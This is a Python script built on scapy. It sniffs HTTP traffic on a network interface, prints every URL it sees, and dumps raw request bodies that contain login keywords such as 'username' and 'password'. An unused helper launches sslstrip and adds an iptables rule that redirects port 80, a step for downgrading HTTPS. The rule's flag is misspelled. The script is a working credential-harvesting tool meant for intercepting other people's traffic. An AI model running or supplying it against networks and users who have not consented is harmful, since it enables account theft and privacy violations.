import scapy.all as scapy
from scapy.layers import http
import optparse
import subprocess


def ssl_strip():
    subprocess.call("sslstrip")    #10000 port
    subprocess.call("iptables -t nat -A PREROUTING -p tcp"
                    " --destionation-port 80 -j REDIRECT --to-port 10000")


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="interface")
    (option, arguments) = parser.parse_args()

    return option


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)


def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return str(url)


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load_raw = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]

        for key in keywords:
            if key in load_raw:
                return str(load_raw)


packet_number = 0


def process_sniff_packet(packet):
    global packet_number
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        packet_number += 1
        print(f"[N] >{packet_number}<")
        print(f"[+] Url found - {url}")
        login_info = str(get_login_info(packet))

        if login_info:
            print(f"[+] Possible username/login :: \n{login_info}\n", "::"*16)


if __name__ == "__main__":
    options = get_arguments()
    interface = options.interface

    sniff(interface)
